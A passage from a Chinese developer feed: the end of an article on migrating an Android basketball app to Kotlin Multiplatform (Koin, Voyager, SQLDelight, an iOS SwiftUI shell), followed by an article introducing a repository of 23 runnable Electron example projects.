<p>迁移体验：Hilt 的 <code>@HiltViewModel</code> + <code>@Inject constructor</code> 全部删掉，换成 Koin 的 <code>factory { }</code> 声明。代码量反而少了。</p>
<h3 data-id="heading-11">四、导航：Navigation3 → Voyager</h3>
<p>导航是迁移中设计决策最多的部分。Voyager 提供了 <code>TabNavigator</code> + <code>Navigator</code> 的组合，很适合底部 Tab + 页面栈的场景。</p>
<h4 data-id="heading-12">Tab 定义</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">object</span> GamesTab : Tab {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> options <span class="hljs-meta">@Composable</span> <span class="hljs-keyword">get</span>() = TabOptions(
        index = 0u,
        title = <span class="hljs-string">"Games"</span>,
        icon = rememberVectorPainter(Icons.Default.SportsBasketball),
    )

    <span class="hljs-meta">@Composable</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">Content</span><span class="hljs-params">()</span></span> {
        Navigator(GamesListScreen()) { navigator -&gt;
            SlideTransition(navigator)
        }
    }
}
</code></pre>
<p>每个 Tab 内嵌独立的 <code>Navigator</code>，Tab 切换时各自的导航栈互不影响。</p>
<h4 data-id="heading-13">Screen 定义</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GamesListScreen</span> : <span class="hljs-type">Screen</span> {
    <span class="hljs-meta">@Composable</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">Content</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> screenModel = koinScreenModel&lt;GamesListScreenModel&gt;()
        <span class="hljs-keyword">val</span> uiState <span class="hljs-keyword">by</span> screenModel.uiState.collectAsState()
        <span class="hljs-comment">// UI ...</span>
    }
}
</code></pre>
<h4 data-id="heading-14">页面间传参</h4>
<p>Voyager 通过构造函数传参，简单直接：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GameDetailScreen</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> gameId: <span class="hljs-built_in">Int</span>) : Screen { ... }

<span class="hljs-comment">// 导航</span>
navigator.push(GameDetailScreen(gameId = <span class="hljs-number">123</span>))
</code></pre>
<p>Koin 端用 <code>parametersOf</code> 传递：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 定义</span>
factory { params -&gt; GameDetailScreenModel(params.<span class="hljs-keyword">get</span>(), <span class="hljs-keyword">get</span>()) }

<span class="hljs-comment">// 使用</span>
<span class="hljs-keyword">val</span> screenModel = koinScreenModel&lt;GameDetailScreenModel&gt; { parametersOf(gameId) }
</code></pre>
<h4 data-id="heading-15">主入口</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">HoopsNowApp</span><span class="hljs-params">()</span></span> {
    HoopsNowTheme {
        TabNavigator(GamesTab) {
            Scaffold(
                bottomBar = {
                    NavigationBar {
                        TabNavigationItem(GamesTab)
                        TabNavigationItem(TeamsTab)
                        TabNavigationItem(PlayersTab)
                        TabNavigationItem(FavoritesTab)
                    }
                },
            ) {
                CurrentTab()
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-16">五、状态管理：ViewModel → ScreenModel</h3>
<p>这是最简单的一步。Voyager 的 <code>ScreenModel</code> 和 <code>ViewModel</code> 几乎一模一样：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 迁移前</span>
<span class="hljs-meta">@HiltViewModel</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GamesListViewModel</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> gamesRepository: GamesRepository,
) : ViewModel() {
    <span class="hljs-keyword">val</span> uiState = gamesRepository.getGames()
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(<span class="hljs-number">5000</span>), Loading)
}

<span class="hljs-comment">// 迁移后</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GamesListScreenModel</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> gamesRepository: GamesRepository,
) : ScreenModel {
    <span class="hljs-keyword">val</span> uiState = gamesRepository.getGames()
        .stateIn(screenModelScope, SharingStarted.WhileSubscribed(<span class="hljs-number">5000</span>), Loading)
}
</code></pre>
<p>改动点：</p>
<ul>
<li>删除 <code>@HiltViewModel</code> 和 <code>@Inject constructor</code></li>
<li><code>ViewModel()</code> → <code>ScreenModel</code></li>
<li><code>viewModelScope</code> → <code>screenModelScope</code></li>
<li><code>collectAsStateWithLifecycle()</code> → <code>collectAsState()</code>（CMP 中没�� AndroidX Lifecycle）</li>
</ul>
<h3 data-id="heading-17">六、Android 入口精简</h3>
<p>迁移后 <code>app</code> 模块只剩两个文件：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// HoopsNowApplication.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">HoopsNowApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        startKoin {
            androidContext(<span class="hljs-keyword">this</span><span class="hljs-symbol">@HoopsNowApplication</span>)
            modules(sharedModule, platformModule())
        }
    }
}

<span class="hljs-comment">// MainActivity.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">ComponentActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        enableEdgeToEdge(...)
        setContent {
            CompositionLocalProvider(
                LocalTeamLogos provides TeamLogoProvider.getAllLogos(),
                LocalPlayerHeadshot provides PlayerHeadshotProvider::getHeadshotUrl,
            ) {
                HoopsNowApp()  <span class="hljs-comment">// 来自 shared 模块</span>
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-18">七、iOS 接入</h3>
<p>iOS 端更简单，只需要一个 SwiftUI 壳：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// iOSApp.swift</span>
<span class="hljs-keyword">@main</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">iOSApp</span>: <span class="hljs-title class_">App</span> {
    <span class="hljs-keyword">init</span>() {
        <span class="hljs-type">KoinHelperKt</span>.doInitKoin()
    }
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">Scene</span> {
        <span class="hljs-type">WindowGroup</span> { <span class="hljs-type">ContentView</span>() }
    }
}

<span class="hljs-comment">// ContentView.swift</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">ComposeView</span>().ignoresSafeArea(.all)
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ComposeView</span>: <span class="hljs-title class_">UIViewControllerRepresentable</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">makeUIViewController</span>(<span class="hljs-params">context</span>: <span class="hljs-type">Context</span>) -&gt; <span class="hljs-type">UIViewController</span> {
        <span class="hljs-type">MainViewControllerKt</span>.<span class="hljs-type">MainViewController</span>()
    }
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateUIViewController</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">uiViewController</span>: <span class="hljs-type">UIViewController</span>, <span class="hljs-params">context</span>: <span class="hljs-type">Context</span>) {}
}
</code></pre>
<p>shared 模块中提供 iOS 入口：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// iosMain - MainViewController.kt</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">MainViewController</span><span class="hljs-params">()</span></span> = ComposeUIViewController { HoopsNowApp() }
</code></pre>
<p>就这样，iOS 端就能跑起来了。整个 Compose UI 通过 <code>ComposeUIViewController</code> 嵌入 SwiftUI。</p>
<h3 data-id="heading-19">八、清理旧代码</h3>
<p>迁移完成后，大量旧文件可以删除：</p>
<ul>
<li><code>core/</code> — 9 个旧 Android 模块全部删除</li>
<li><code>feature/</code> — 4 个功能模块全部删除</li>
<li><code>app/navigation/</code> — 旧 Navigation3 代码</li>
<li><code>build-logic/</code> 中的 6 个 Convention Plugin（Hilt、Room、Feature、Library 等）</li>
<li><code>libs.versions.toml</code> 中的 Hilt、KSP 相关声明</li>
</ul>
<p>从 20+ 个模块精简到 2 个（<code>app</code> + <code>shared</code>），<code>settings.gradle.kts</code> 清爽了很多。</p>
<h3 data-id="heading-20">迁移后的项目结构</h3>
<pre><code class="hljs language-bash" lang="bash">hoopsnow/
├── app/                                <span class="hljs-comment"># Android 入口（2 个文件）</span>
├── shared/                             <span class="hljs-comment"># KMP 共享模块</span>
│   └── src/
│       ├── commonMain/                 <span class="hljs-comment"># 全部业务逻辑 + UI</span>
│       │   ├── kotlin/.../
│       │   │   ├── core/               <span class="hljs-comment"># 数据层（model, data, database, network��</span>
│       │   │   ├── di/                 <span class="hljs-comment"># Koin 模块</span>
│       │   │   └── ui/                 <span class="hljs-comment"># UI 层（screens, components, theme, navigation）</span>
│       │   └── sqldelight/             <span class="hljs-comment"># 数据库定义</span>
│       ├── androidMain/                <span class="hljs-comment"># Android 平台实现</span>
│       └── iosMain/                    <span class="hljs-comment"># iOS 平台实现</span>
├── iosApp/                             <span class="hljs-comment"># iOS 入口（2 个 Swift 文件）</span>
└── build-logic/                        <span class="hljs-comment"># Convention Plugins（精简）</span>
</code></pre>
<h3 data-id="heading-21">踩坑总结</h3>
<h4 data-id="heading-22">1. SQLDelight 属性名</h4>
<p>生成的 Queries 属性名基于 <code>.sq</code> 文件名（<code>gameQueries</code>），不是 <code>CREATE TABLE</code> 的表名（<code>gameEntityQueries</code>）。</p>
<h4 data-id="heading-23">2. collectAsStateWithLifecycle 不可用</h4>
<p>这是 AndroidX Lifecycle 的扩展，CMP 中用 <code>collectAsState()</code> 替代。ScreenModel 会在 Screen dispose 时自动取消 scope，不用担心泄漏。</p>
<h4 data-id="heading-24">3. Kotlin 类型推断与 SQLDelight</h4>
<p>链式 mapper 调用时类型推断可能失败，写显式的 <code>toModel()</code> 扩展函数解决。</p>
<h4 data-id="heading-25">4. Material Icons Extended</h4>
<p><code>Icons.Default.StarBorder</code>、<code>Icons.Default.OpenInNew</code> 等图标需要额外添加 <code>compose.materialIconsExtended</code> 依赖。</p>
<h4 data-id="heading-26">5. Koin ScreenModel 参数传递</h4>
<p>带参数的 ScreenModel 需要用 <code>factory { params -&gt; }</code> 定义，使用时通过 <code>koinScreenModel { parametersOf(...) }</code> 传入。</p>
<h4 data-id="heading-27">6. iOS Framework 编译</h4>
<p>每次修改 shared 代码后需要重新编译 Framework。开发阶段建议在 Xcode Build Phase 中添加自动编译脚本。</p>
<h3 data-id="heading-28">迁移收益</h3>








































<table><thead><tr><th>指标</th><th>迁移前</th><th>迁移后</th></tr></thead><tbody><tr><td>模块数量</td><td>20+</td><td>2 (app + shared)</td></tr><tr><td>支持平台</td><td>Android</td><td>Android + iOS</td></tr><tr><td>UI 代码共享</td><td>0%</td><td>100%</td></tr><tr><td>业务逻辑共享</td><td>0%</td><td>100%</td></tr><tr><td>build.gradle 文件</td><td>20+</td><td>3</td></tr><tr><td>Convention Plugins</td><td>7</td><td>2</td></tr></tbody></table>
<p>最大的收益是 iOS 端几乎零成本接入 — 只需要两个 Swift 文件就能跑起完整的应用。</p>
<h3 data-id="heading-29">依赖版本参考</h3>

















































<table><thead><tr><th>库</th><th>版本</th></tr></thead><tbody><tr><td>Kotlin</td><td>2.0.21</td></tr><tr><td>Compose Multiplatform</td><td>1.7.3</td></tr><tr><td>Ktor</td><td>3.0.3</td></tr><tr><td>SQLDelight</td><td>2.0.2</td></tr><tr><td>Koin</td><td>4.0.0</td></tr><tr><td>Voyager</td><td>1.1.0-beta03</td></tr><tr><td>Coil 3</td><td>3.0.4</td></tr><tr><td>kotlinx-serialization</td><td>1.7.3</td></tr><tr><td>kotlinx-datetime</td><td>0.6.1</td></tr><tr><td>Coroutines</td><td>1.9.0</td></tr></tbody></table>
<h3 data-id="heading-30">总结</h3>
<p>整个迁移花了大约一周时间，其中数据库迁移（Room → SQLDelight）和导航迁移（Navigation3 → Voyager）占了大部分工作量。网络层（Ktor）和序列化（kotlinx-serialization）本身就是 KMP 库，基本不用改。</p>
<p>如果你的 Android 项目已经在用 Kotlin + Compose，迁移到 KMP + CMP 的成本比想象中低很多。最大的障碍是 Room 和 Hilt 这两个 Android 专属库的替换，但 SQLDelight 和 Koin 都是成熟的替代方���。</p>
<p>项目源码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flaibinzhi%2Fhoopsnow" target="_blank" title="https://github.com/laibinzhi/hoopsnow" ref="nofollow noopener noreferrer">GitHub - laibinzhi/hoopsnow</a>（cmp 分支）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[想学 Electron？这份「能跑的示例集」一篇搞懂]]></title>    <link>https://juejin.cn/post/7605817795628990514</link>    <guid>https://juejin.cn/post/7605817795628990514</guid>    <pubDate>2026-02-13T04:03:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605817795628990514" data-draft-id="7605907495769554953" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="想学 Electron？这份「能跑的示例集」一篇搞懂"/> <meta itemprop="keywords" content="Electron,前端"/> <meta itemprop="datePublished" content="2026-02-13T04:03:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一枚小太阳"/> <meta itemprop="url" content="https://juejin.cn/user/2771228509602109"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            想学 Electron？这份「能跑的示例集」一篇搞懂
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771228509602109/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一枚小太阳
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T04:03:58.000Z" title="Fri Feb 13 2026 04:03:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">想学 Electron？这份「能跑的示例集」一篇搞懂</h2>
<p>VS Code、钉钉、Slack、Figma 桌面版……这些你熟悉的软件，背后都有同一个名字：<strong>Electron</strong>。用前端技术（HTML/CSS/JS）就能做桌面应用，是很多团队的选择。但官方文档知识点多、自己从零搭又容易踩坑，<strong>有没有一份「按主题拆好、每个都能直接跑」的示例？</strong> 有。本文就介绍这样一份示例仓库，并帮你把 Electron 的核心知识点串一遍，<strong>看完一篇，知道学什么、去哪看代码</strong>。</p>
<hr/>
<h3 data-id="heading-1">一、Electron 是什么？这个仓库能帮你什么？</h3>
<p><strong>一句话：</strong> Electron 让你用写网页的技术（HTML/CSS/JavaScript）来开发桌面软件，一套代码可跑在 Windows、macOS、Linux 上。</p>
<p><strong>这个仓库做什么：</strong> 把 Electron 常见能力拆成 <strong>23 个独立小项目</strong>，每个项目一个文件夹，里面是<strong>可运行代码 + 说明文档</strong>。你不需要从零搭环境，克隆下来进目录、装依赖、运行命令就能看到效果。适合：</p>
<ul>
<li><strong>想学 Electron 的人</strong>：按主题边看边跑，比光看文档好懂；</li>
<li><strong>做桌面端开发的人</strong>：遇到「窗口、菜单、通知、IPC」等问题，可以对着对应示例改；</li>
<li><strong>面试前突击的人</strong>：仓库里还带 3 套 Electron 面试卷（含答案），可用来自查。</li>
</ul>
<hr/>
<h3 data-id="heading-2">二、怎么跑起来？（3 步）</h3>
<p><strong>环境准备：</strong> 本机装好 <strong>Node.js</strong>（建议 18 及以上），示例在 Windows 11 下验证过，macOS / Linux 下大多也可直接运行。</p>
<p><strong>运行任意一个示例：</strong></p>
<ol>
<li>克隆仓库；</li>
<li>进入想玩的案例目录（例如 <code>ipc</code>、<code>darkmode</code>）；</li>
<li>在该目录下执行：<code>npm install</code> → <code>npm run start</code> 或 <code>npm run start:1</code>（具体看该目录的 readme）。</li>
</ol>
<p>每个案例的<strong>详细命令和说明</strong>都在对应目录的 <strong>readme.md</strong> 里，进去就能看到。</p>
<hr/>
<h3 data-id="heading-3">三、Electron 知识点串讲（对应仓库怎么用）</h3>
<p>下面按「从入门到进阶」的顺序，把主要概念过一遍，并标出<strong>仓库里哪一类示例可以对照着看</strong>。不展开代码细节，只帮你建立地图。</p>
<h4 data-id="heading-4">1. 入门：第一个应用长什么样？</h4>
<p>Electron 应用至少有两个「角色」：<strong>主进程</strong>（负责创建窗口、系统 API）和<strong>渲染进程</strong>（你看到的页面）。两者不能直接互相调函数，要通过 <strong>preload 脚本</strong>安全地暴露接口，或用 <strong>IPC</strong>（进程间通信）传消息。</p>
<p><strong>仓库对应：</strong> <code>tutorial-first-app</code> —— 第一个应用、主进程 / 渲染进程 / preload / IPC 入门。</p>
<hr/>
<h4 data-id="heading-5">2. 进程与通信：页面和「后台」怎么配合？</h4>
<ul>
<li><strong>IPC</strong>：渲染进程和主进程互相发消息（单向、双向、主进程主动推给页面等）。</li>
<li><strong>MessagePort</strong>：更灵活的通道，适合「渲染进程直连」「流式回复」等场景。</li>
<li><strong>Utility Process（效率进程）</strong>：跑 CPU 重活或容易崩的逻辑，和主进程隔离，用 MessagePort 通信。</li>
<li><strong>多线程</strong>：在渲染进程里用 Web Worker，避免大量计算卡住界面。</li>
<li><strong>沙盒</strong>：渲染进程默认沙盒、安全配置，减少安全风险。</li>
</ul>
<p><strong>仓库对应：</strong> <code>ipc</code>、<code>message-ports</code>、<code>efficiency-process</code>、<code>multithreading</code>、<code>sandbox</code>。</p>
<hr/>
<h4 data-id="heading-6">3. 窗口与 UI：桌面应用「长什么样」？</h4>
<ul>
<li><strong>暗色模式</strong>：用系统主题或自己切换，和 CSS 的 <code>prefers-color-scheme</code> 配合。</li>
<li><strong>任务栏</strong>：Windows 上的 JumpList、缩略图工具栏、进度条、图标闪烁等。</li>
<li><strong>窗口定制</strong>：无边框、自定义标题栏、拖拽区域。</li>
<li><strong>进度条</strong>：在任务栏 / Dock 上显示进度（如下载、处理任务）。</li>
</ul>
<p><strong>仓库对应：</strong> <code>darkmode</code>、<code>windows-taskbar</code>、<code>window-customization</code>、<code>progressbar</code>。</p>
<hr/>
<h4 data-id="heading-7">4. 系统与原生能力：和操作系统打交道</h4>
<ul>
<li><strong>菜单</strong>：应用菜单、右键菜单、托盘菜单。</li>
<li><strong>快捷键</strong>：绑定在菜单上的、全局的、窗口内自己监听的。</li>
<li><strong>系统通知</strong>：像微信/邮件那样在系统通知栏弹出，而不是只在页面里弹个提示。</li>
<li><strong>设备访问</strong>：例如蓝牙（Web Bluetooth API）。</li>
<li><strong>深度链接</strong>：自定义协议，从浏览器或别的应用点链接唤起你的应用。</li>
</ul>
<p><strong>仓库对应：</strong> <code>menus</code>、<code>keyboardshortcut</code>、<code>notificationsDemo</code>、<code>bluetooth</code>、<code>deeplinks</code>。</p>
<hr/>
<h4 data-id="heading-8">5. 文件与文档、Web 与导航</h4>
<ul>
<li><strong>文件拖拽</strong>：把文件从应用拖到桌面或资源管理器。</li>
<li><strong>最近文档</strong>：系统「最近打开」列表的集成。</li>
<li><strong>Web 嵌入</strong>：在窗口里嵌网页（iframe、webview、WebContentsView）。</li>
<li><strong>导航历史</strong>：窗口内前进/后退（goBack / goForward）。</li>
<li><strong>在线/离线</strong>：检测网络状态，做离线提示或缓存策略。</li>
</ul>
<p><strong>仓库对应：</strong> <code>draganddrop</code>、<code>recentdocuments</code>、<code>web-embeds</code>、<code>navigationHistory</code>、<code>onlineofflineevents</code>。</p>
<hr/>
<h4 data-id="heading-9">6. 其他常用能力</h4>
<ul>
<li><strong>离屏渲染</strong>：在不可见的画布上渲染（例如生成图、PDF）。</li>
<li><strong>拼写检查</strong>：系统级拼写检查集成。</li>
</ul>
<p><strong>仓库对应：</strong> <code>offscreenrendering</code>、<code>spellchecker</code>。</p>
<hr/>
<h4 data-id="heading-10">7. 学习与面试</h4>
<p>仓库内带 <strong>paper</strong> 目录：3 套 Electron 面试卷，各 100 分，含答案与解析，适合考前自查。</p>
<hr/>
<h3 data-id="heading-11">四、案例目录一览（按需进目录看 readme 和代码）</h3>
<p>下面表格里的<strong>目录名</strong>，在仓库里对应一个文件夹，点进去有 <strong>readme</strong> 和<strong>可运行代码</strong>。不同子项目可能有不同启动命令（如 <code>npm run start:1</code>、<code>start:2</code>），以该目录下的 readme 为准。</p>





















































































































































<table><thead><tr><th>分类</th><th>序号</th><th>目录</th><th>说明</th></tr></thead><tbody><tr><td>入门</td><td>1</td><td>tutorial-first-app</td><td>第一个应用（主进程、渲染进程、preload、IPC 入门）</td></tr><tr><td>窗口与 UI</td><td>2</td><td>darkmode</td><td>黑暗模式 / 主题切换</td></tr><tr><td/><td>3</td><td>windows-taskbar</td><td>Windows 任务栏（JumpList、缩略图、叠加图标、闪烁）</td></tr><tr><td/><td>4</td><td>window-customization</td><td>自定义窗口（无边框、自定义标题栏、拖拽区域）</td></tr><tr><td/><td>5</td><td>progressbar</td><td>任务栏/Dock 进度条</td></tr><tr><td>进程与通信</td><td>6</td><td>ipc</td><td>进程间通信（单向/双向、主→渲染）</td></tr><tr><td/><td>7</td><td>message-ports</td><td>消息端口（MessageChannel、流式回复）</td></tr><tr><td/><td>8</td><td>efficiency-process</td><td>效率进程（Utility Process、MessagePort）</td></tr><tr><td/><td>9</td><td>multithreading</td><td>多线程（Web Workers）</td></tr><tr><td/><td>10</td><td>sandbox</td><td>进程沙盒与安全配置</td></tr><tr><td>系统与原生</td><td>11</td><td>menus</td><td>菜单（应用菜单、上下文菜单、托盘）</td></tr><tr><td/><td>12</td><td>keyboardshortcut</td><td>键盘快捷键（局部、全局、窗口内）</td></tr><tr><td/><td>13</td><td>notificationsDemo</td><td>系统通知（主进程/渲染进程）</td></tr><tr><td/><td>14</td><td>bluetooth</td><td>设备访问（如蓝牙）</td></tr><tr><td/><td>15</td><td>deeplinks</td><td>深度链接（自定义协议、从链接唤起应用）</td></tr><tr><td>文件与文档</td><td>16</td><td>draganddrop</td><td>文件拖拽（拖出到桌面/资源管理器）</td></tr><tr><td/><td>17</td><td>recentdocuments</td><td>最近文件（系统最近文档列表）</td></tr><tr><td>Web 与导航</td><td>18</td><td>web-embeds</td><td>Web 嵌入（iframe、webview、WebContentsView）</td></tr><tr><td/><td>19</td><td>navigationHistory</td><td>导航历史（前进/后退）</td></tr><tr><td/><td>20</td><td>onlineofflineevents</td><td>在线/离线事件</td></tr><tr><td>其他</td><td>21</td><td>offscreenrendering</td><td>离屏渲染</td></tr><tr><td/><td>22</td><td>spellchecker</td><td>拼写检查器</td></tr><tr><td>学习与面试</td><td>23</td><td>paper</td><td>Electron 面试卷（3 套，含答案与解析）</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-12">五、去哪看代码？仓库在这里</h3>
<p>以上所有示例的<strong>完整代码、运行命令和说明</strong>都在下面这个仓库里，每个案例独立可运行，按目录即可找到对应 readme 和代码。</p>
